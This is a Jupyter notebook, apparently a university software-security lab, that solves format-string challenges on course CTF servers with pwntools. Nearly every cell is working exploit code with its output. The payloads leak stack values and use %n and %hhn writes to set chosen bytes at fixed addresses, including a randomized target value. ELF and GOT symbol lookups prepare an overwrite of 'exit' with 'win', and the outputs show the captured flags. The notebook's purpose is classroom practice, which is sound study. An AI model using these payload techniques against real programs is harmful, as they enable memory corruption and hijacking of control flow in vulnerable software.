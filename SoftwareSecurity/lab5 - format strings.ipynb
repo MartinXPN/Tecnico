{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TERMINFO=/usr/share/terminfo\n",
      "env: PWNLIB_NOTERM=true\n"
     ]
    }
   ],
   "source": [
    "%env TERMINFO=/usr/share/terminfo\n",
    "%env PWNLIB_NOTERM=true"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "ContextType()"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "context"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "SERVER = \"mustard.stt.rnl.tecnico.ulisboa.pt\"\n",
    "PORT = 10092\n",
    "    \n",
    "s = remote(SERVER, PORT, timeout=9999, level='error')\n",
    "\n",
    "# 0x804a040\n",
    "msg = '\\x40\\xa0\\x04\\x08' + '.%08x'*6 + '%n'\n",
    "s.sendline(msg)\n",
    "print(s.recvall())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "@ \u0004\b.%08x.%08x.%08x.%08x.%08x.%08xAAAAAAAAAA%7$n\n",
      "b'@\\xa0\\x04\\x08.ffffdc5c.0000007f.ffffdcb8.f7ffda74.00000001.f7fce2e8AAAAAAAAAA\\nSuccess! You hit the target!\\nHere is your flag: SSof{And_where_I_want}\\n'\n"
     ]
    }
   ],
   "source": [
    "from pwn import *\n",
    "\n",
    "SERVER = \"mustard.stt.rnl.tecnico.ulisboa.pt\"\n",
    "PORT = 10093\n",
    "    \n",
    "s = remote(SERVER, PORT, timeout=9999, level='error')\n",
    "\n",
    "# 0x804a040 = 58\n",
    "msg = '\\x40\\xa0\\x04\\x08' + '.%08x'*6 + 'A'*10  + '%7$n'\n",
    "print(msg)\n",
    "# msg = 'AAAA' + '.%08x' * 20\n",
    "s.sendline(msg)\n",
    "print(s.recvall())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 196,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "G \u0004\b%0100x%7$hhn\n",
      "b'G\\xa0\\x04\\x0800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffdc5c\\nSuccess! You hit the target!\\nHere is your flag: SSof{And_write_very_big_numbers}\\n'\n"
     ]
    }
   ],
   "source": [
    "from pwn import *\n",
    "\n",
    "SERVER = \"mustard.stt.rnl.tecnico.ulisboa.pt\"\n",
    "PORT = 10094\n",
    "\n",
    "s = remote(SERVER, PORT, timeout=9999, level='error')\n",
    "\n",
    "# [0x804a044] target => we need to write 1 to the most significant byte => [0x804a047]\n",
    "msg = '\\x47\\xa0\\x04\\x08' + '%0100x' + '%7$hhn'\n",
    "print(msg)\n",
    "# msg = 'AAAA' + '.%08x' * 20\n",
    "s.sendline(msg)\n",
    "print(s.recvall())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 235,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'AAAA.ffffdc5c.0000007f.ffffdcb8.f7ffda74.00000001.f7fce2e8.41414141.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.Oops, not quite!\\n'\n"
     ]
    }
   ],
   "source": [
    "SERVER = \"mustard.stt.rnl.tecnico.ulisboa.pt\"\n",
    "PORT = 10092\n",
    "    \n",
    "s = remote(SERVER, PORT, timeout=9999, level='error')\n",
    "\n",
    "# 0x804a040\n",
    "msg = 'AAAA' + '.%08x'*60\n",
    "s.sendline(msg)\n",
    "print(s.recvall())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 252,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "`G \u0004\b` 15 ---> 271\n",
      "`F \u0004\b` 95 ---> 95\n",
      "`E \u0004\b` 26 ---> 282\n",
      "`D \u0004\b` 169 ---> 169\n",
      "G \u0004\bF \u0004\bE \u0004\bD \u0004\b%08x%08x%08x%08x%08x%08x%207x%7$hhn%80x%8$hhn%187x%9$hhn%143x%10$hhn\n",
      "b'G\\xa0\\x04\\x08F\\xa0\\x04\\x08E\\xa0\\x04\\x08D\\xa0\\x04\\x08ffffdc5c0000007fffffdcb8f7ffda7400000001f7fce2e8                                                                                                                                                                                                        804a047                                                                         804a046                                                                                                                                                                                    804a045                                                                                                                                        804a044\\nSuccess! You hit the target!\\nHere is your flag: SSof{And_write_BIIIIIG_numbers_Very_BIG}\\n'\n"
     ]
    }
   ],
   "source": [
    "from pwn import *\n",
    "\n",
    "SERVER = \"mustard.stt.rnl.tecnico.ulisboa.pt\"\n",
    "PORT = 10095\n",
    "\n",
    "s = remote(SERVER, PORT, timeout=9999, level='error')\n",
    "\n",
    "# [0x804a044] target\n",
    "# 0x0f5f1aa9\n",
    "addr2val = {\n",
    "    '\\x44\\xa0\\x04\\x08': 0xa9,\n",
    "    '\\x45\\xa0\\x04\\x08': 0x1a,\n",
    "    '\\x46\\xa0\\x04\\x08': 0x5f,\n",
    "    '\\x47\\xa0\\x04\\x08': 0x0f,\n",
    "}\n",
    "addresses = list(addr2val.keys())[::-1]\n",
    "addr2val = list(addr2val.items())[::-1]\n",
    "\n",
    "msg = ''.join(addresses)\n",
    "cur_printed = 4 * len(addresses)\n",
    "\n",
    "msg += '%08x' * 6\n",
    "cur_printed += 6 * 8\n",
    "\n",
    "for i, (addr, val) in enumerate(addr2val):\n",
    "    cur_printed %= 0x100\n",
    "    print(f'`{addr}`', val, end=' ---> ')\n",
    "    \n",
    "    # Print 'padding'\n",
    "    to_print = (val - cur_printed + 0x100) % 0x100\n",
    "    msg += f'%{to_print}x%{7+i}$hhn'\n",
    "    cur_printed += to_print\n",
    "    print(cur_printed)\n",
    "    \n",
    "print(msg)\n",
    "s.sendline(msg)\n",
    "print(s.recvall())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 251,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'Your random value is: 0x6813e64d\\n'\n",
      "{'p\\xa0\\x04\\x08': 77, 'q\\xa0\\x04\\x08': 230, 'r\\xa0\\x04\\x08': 19, 's\\xa0\\x04\\x08': 104}\n",
      "`s \u0004\b` 104 ---> 104\n",
      "`r \u0004\b` 19 ---> 275\n",
      "`q \u0004\b` 230 ---> 230\n",
      "`p \u0004\b` 77 ---> 333\n",
      "s \u0004\br \u0004\bq \u0004\bp \u0004\b%08x%08x%08x%08x%08x%08x%40u%7$hhn%171u%8$hhn%211u%9$hhn%103u%10$hhn\n",
      "b's\\xa0\\x04\\x08r\\xa0\\x04\\x08q\\xa0\\x04\\x08p\\xa0\\x04\\x08ffffdc5c0000007f00000000f7fe2a90080481f800000001                               134520947                                                                                                                                                                  134520946                                                                                                                                                                                                          134520945                                                                                              134520944\\nSuccess! You hit the target!\\nHere is your flag: SSof{WoW!Random_numbers_also}\\n'\n"
     ]
    }
   ],
   "source": [
    "from pwn import *\n",
    "\n",
    "SERVER = \"mustard.stt.rnl.tecnico.ulisboa.pt\"\n",
    "PORT = 10096\n",
    "\n",
    "s = remote(SERVER, PORT, timeout=9999, level='error')\n",
    "\n",
    "line = s.recvline()\n",
    "print(line)\n",
    "# [0x804a070] target\n",
    "# value from end to front\n",
    "addr2val = {\n",
    "    '\\x70\\xa0\\x04\\x08': int(line[-3:-1], 16),\n",
    "    '\\x71\\xa0\\x04\\x08': int(line[-5:-3], 16),\n",
    "    '\\x72\\xa0\\x04\\x08': int(line[-7:-5], 16),\n",
    "    '\\x73\\xa0\\x04\\x08': int(line[-9:-7], 16),\n",
    "}\n",
    "print(addr2val)\n",
    "addresses = list(addr2val.keys())[::-1]\n",
    "addr2val = list(addr2val.items())[::-1]\n",
    "\n",
    "msg = ''.join(addresses)\n",
    "cur_printed = 4 * len(addresses)\n",
    "\n",
    "msg += '%08x' * 6\n",
    "cur_printed += 6 * 8\n",
    "\n",
    "for i, (addr, val) in enumerate(addr2val):\n",
    "    cur_printed %= 0x100\n",
    "    print(f'`{addr}`', val, end=' ---> ')\n",
    "    \n",
    "    # Print 'padding'\n",
    "    to_print = (val - cur_printed + 0x100) % 0x100\n",
    "    msg += f'%{to_print}u%{7+i}$hhn'\n",
    "    cur_printed += to_print\n",
    "    print(cur_printed)\n",
    "    \n",
    "print(msg)\n",
    "s.sendline(msg)\n",
    "print(s.recvall())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 261,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x804849b 134513819\n",
      "0x804a018 134520856\n"
     ]
    }
   ],
   "source": [
    "from pwn import *\n",
    "elf = ELF('/Users/martinmirakyan/Desktop/bin')\n",
    "win_address = elf.symbols['win']\n",
    "exit_address = elf.got['exit']\n",
    "print(hex(win_address), win_address)\n",
    "print(hex(exit_address), exit_address)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 260,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(134513819, 134513520)"
      ]
     },
     "execution_count": 260,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "elf.symbols['win'], elf.symbols['exit']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 258,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'__gmon_start__': 134520828,\n",
       " 'read': 134520844,\n",
       " 'printf': 134520848,\n",
       " 'system': 134520852,\n",
       " 'exit': 134520856,\n",
       " '__libc_start_main': 134520860}"
      ]
     },
     "execution_count": 258,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "elf.got"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
